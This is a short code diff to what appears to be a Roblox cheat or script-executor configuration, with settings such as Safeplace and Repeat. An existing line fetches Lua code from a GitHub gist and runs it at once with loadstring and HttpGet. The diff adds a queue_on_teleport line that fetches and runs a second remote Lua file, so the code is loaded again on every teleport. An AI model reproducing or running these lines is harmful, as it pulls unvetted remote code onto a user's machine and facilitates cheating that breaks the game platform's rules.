@@ -45,3 +45,5 @@ Safeplace = true
 Repeat = true
 -----------------------------------------------------------------------
 loadstring(game:HttpGet"https://gist.githubusercontent.com/NotHubris/4e6fdc88d84c30afa9b28c590f273bbf/raw")()
+
+queue_on_teleport(loadstring(game:HttpGet("https://raw.githubusercontent.com/VariantL2/Lua/main/NewFile.lua",true))())
